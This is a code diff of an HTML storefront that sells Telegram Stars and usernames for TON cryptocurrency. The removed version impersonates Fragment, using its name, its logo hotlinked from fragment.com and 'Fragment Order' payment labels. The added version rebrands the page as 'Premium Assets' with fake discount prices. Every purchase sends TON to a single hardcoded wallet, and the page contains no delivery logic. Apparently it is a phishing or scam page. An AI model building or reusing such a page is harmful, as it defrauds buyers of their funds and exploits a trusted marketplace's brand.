@@ -2,97 +2,100 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment: Usernames & Stars</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Premium Stars & Assets Store</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background-color: #111b24; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-        .navbar { background: #17212b; padding: 15px 20px; display: flex; align-items: center; border-bottom: 1px solid #232e3c; }
-        .logo { font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 8px; }
-        .logo img { width: 24px; }
+        :root { 
+            --bg: #050505; 
+            --card-bg: #121212; 
+            --accent: #d4af37; /* ذهبي ملكي */
+            --text: #ffffff; 
+            --dim: #777777; 
+            --border: #222222;
+            --input: #1a1a1a;
+        }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, sans-serif; margin: 0; padding: 0; }
         
-        .container { max-width: 500px; margin: 20px auto; padding: 0 15px; }
-        .tabs { display: flex; gap: 20px; border-bottom: 2px solid #232e3c; margin-bottom: 20px; padding-bottom: 10px; }
-        .tab { color: #8191a1; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; }
-        .tab.active { color: #50a2e3; border-bottom: 2px solid #50a2e3; padding-bottom: 10px; margin-bottom: -12px; }
+        /* Header خاص بمتجرنا */
+        .store-header { padding: 30px 20px; text-align: center; background: linear-gradient(to bottom, #121212, #050505); border-bottom: 1px solid var(--border); }
+        .store-logo { width: 60px; height: 60px; background: var(--accent); border-radius: 14px; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 15px; box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); }
+        .store-logo svg { width: 35px; fill: #000; }
+        .store-name { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
+        .store-tagline { color: var(--dim); font-size: 13px; margin-top: 5px; }
 
-        .section-title { font-size: 18px; font-weight: bold; margin-bottom: 15px; display: block; }
-        
-        /* Box Style */
-        .f-box { background: #17212b; border-radius: 12px; padding: 20px; border: 1px solid #232e3c; margin-bottom: 20px; }
-        .label { color: #8191a1; font-size: 11px; font-weight: bold; margin-bottom: 10px; display: block; }
-        
-        .input-group { background: #0f171e; border: 1px solid #2b3a4a; border-radius: 8px; padding: 12px; display: flex; align-items: center; }
-        .input-group input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
-        
-        .price-row { display: flex; justify-content: space-between; align-items: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #232e3c; }
-        .ton-price { color: #fff; font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 5px; }
-        .buy-btn { background: #50a2e3; color: white; border: none; padding: 10px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .container { max-width: 480px; margin: 0 auto; padding: 20px; }
 
-        /* Usernames List */
-        .user-card { background: #17212b; padding: 15px; border-radius: 12px; border: 1px solid #232e3c; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .u-info { display: flex; flex-direction: column; }
-        .u-name { color: #50a2e3; font-weight: bold; }
-        .u-status { color: #00ff00; font-size: 10px; font-weight: bold; }
-        .u-price { font-weight: bold; color: white; font-size: 14px; }
-        .discount-tag { background: #e35050; color: white; font-size: 9px; padding: 2px 5px; border-radius: 4px; margin-left: 5px; }
+        /* الأنظمة التقنية (فراقمينت ستايل) */
+        .f-box { background: var(--card-bg); border-radius: 18px; padding: 25px; border: 1px solid var(--border); margin-bottom: 25px; }
+        .label { color: var(--accent); font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; display: block; letter-spacing: 1px; }
+        
+        .input-field { background: var(--input); border: 1px solid var(--border); border-radius: 12px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; }
+        .input-field input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
+        
+        .price-summary { display: flex; justify-content: space-between; align-items: center; padding-top: 20px; border-top: 1px solid var(--border); }
+        .total-price { font-size: 22px; font-weight: 800; color: #fff; }
+        .total-price span { color: var(--dim); font-size: 14px; margin-left: 5px; }
+
+        .action-btn { background: var(--accent); color: #000; border: none; padding: 12px 30px; border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3); }
+
+        /* قائمة الأصول (يوزرات) */
+        .asset-list { display: flex; flex-direction: column; gap: 12px; }
+        .asset-item { background: var(--card-bg); padding: 18px; border-radius: 16px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        .asset-name { color: var(--accent); font-weight: 700; font-size: 16px; }
+        .asset-meta { font-size: 11px; color: #00ff88; font-weight: 700; margin-top: 4px; }
+        .asset-price { text-align: right; font-weight: 800; font-size: 16px; }
+        .old-p { font-size: 12px; color: var(--dim); text-decoration: line-through; margin-right: 5px; }
 
         #ton-connect-button { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="navbar">
-        <div class="logo">
-            <img src="https://fragment.com/img/logo.svg" alt="">
-            FRAGMENT
+    <div class="store-header">
+        <div class="store-logo">
+            <svg viewBox="0 0 24 24"><path d="M12 2L4.5 20.29L5.21 21L12 18L18.79 21L19.5 20.29L12 2Z"/></svg>
         </div>
+        <div class="store-name">PREMIUM ASSETS</div>
+        <div class="store-tagline">Exclusive Stars & Rare Usernames Marketplace</div>
     </div>
 
     <div class="container">
-        <div class="tabs">
-            <div class="tab active">Stars</div>
-            <div class="tab">Usernames</div>
-            <div class="tab">Numbers</div>
-        </div>
-
-        <span class="section-title">Buy Telegram Stars</span>
         
         <div class="f-box">
-            <span class="label">RECIPIENT</span>
-            <div class="input-group">
-                <input type="text" placeholder="Enter username or ID" value="@me">
+            <span class="label">Step 1: Purchase Stars</span>
+            <div class="input-field">
+                <input type="text" placeholder="Username (e.g. @user)" value="@me">
+            </div>
+            <div class="input-field">
+                <input type="number" id="qty" value="1000" oninput="calc()">
             </div>
             
-            <span class="label" style="margin-top: 20px;">QUANTITY</span>
-            <div class="input-group">
-                <input type="number" id="starsAmount" value="1000" oninput="updatePrice()">
-            </div>
-
-            <div class="price-row">
-                <div class="ton-price" id="totalPrice">2.5 TON</div>
-                <button class="buy-btn" onclick="processPayment()">Buy Stars</button>
+            <div class="price-summary">
+                <div class="total-price" id="res">2.50 <span>TON</span></div>
+                <button class="action-btn" onclick="buy()">Purchase</button>
             </div>
         </div>
 
-        <span class="section-title">Featured Usernames <span class="discount-tag">-30% OFF</span></span>
-
-        <div class="user-card" onclick="startOrder(150, '@D_Gold')">
-            <div class="u-info">
-                <span class="u-name">@D_Gold</span>
-                <span class="u-status">AVAILABLE</span>
+        <span class="label" style="margin-left: 10px;">Marketplace Deals</span>
+        <div class="asset-list">
+            <div class="asset-item" onclick="pay(150, '@Rare')">
+                <div>
+                    <div class="asset-name">@Rare</div>
+                    <div class="asset-meta">INSTANT TRANSFER</div>
+                </div>
+                <div class="asset-price"><span class="old-p">220</span> 150 TON</div>
             </div>
-            <div class="u-price">150 TON <span style="text-decoration: line-through; color: #555; font-size: 10px;">210</span></div>
-        </div>
 
-        <div class="user-card" onclick="startOrder(280, '@VVIP_7')">
-            <div class="u-info">
-                <span class="u-name">@VVIP_7</span>
-                <span class="u-status">AVAILABLE</span>
+            <div class="asset-item" onclick="pay(290, '@King')">
+                <div>
+                    <div class="asset-name">@King</div>
+                    <div class="asset-meta">INSTANT TRANSFER</div>
+                </div>
+                <div class="asset-price"><span class="old-p">450</span> 290 TON</div>
             </div>
-            <div class="u-price">280 TON <span style="text-decoration: line-through; color: #555; font-size: 10px;">400</span></div>
         </div>
-
     </div>
 
     <div id="ton-connect-button"></div>
@@ -103,29 +106,28 @@
             buttonRootId: 'ton-connect-button'
         });
 
-        function updatePrice() {
-            const amount = document.getElementById('starsAmount').value;
-            const price = (amount * 0.0025).toFixed(2);
-            document.getElementById('totalPrice').innerText = price + " TON";
-            return price;
+        function calc() {
+            const q = document.getElementById('qty').value;
+            const p = (q * 0.0025).toFixed(2);
+            document.getElementById('res').innerHTML = p + " <span>TON</span>";
+            return p;
         }
 
-        function processPayment() {
-            const p = updatePrice();
-            const a = document.getElementById('starsAmount').value;
-            if(a < 500) { alert("Minimum 500 Stars"); return; }
-            startOrder(p, a + " Stars");
+        function buy() {
+            const v = calc();
+            const q = document.getElementById('qty').value;
+            if(q < 500) { alert("Min order: 500"); return; }
+            pay(v, q + " Stars");
         }
 
-        async function startOrder(amount, label) {
+        async function pay(a, d) {
             if (!tonConnectUI.connected) { await tonConnectUI.openModal(); return; }
-            const nano = (amount * 1000000000).toString();
             const tx = {
                 validUntil: Math.floor(Date.now() / 1000) + 360,
                 messages: [{
                     address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
-                    amount: nano,
-                    payload: btoa("Fragment Order: " + label)
+                    amount: (a * 1000000000).toString(),
+                    payload: btoa("Order:" + d)
                 }]
             };
             try { await tonConnectUI.sendTransaction(tx); } catch (e) {}
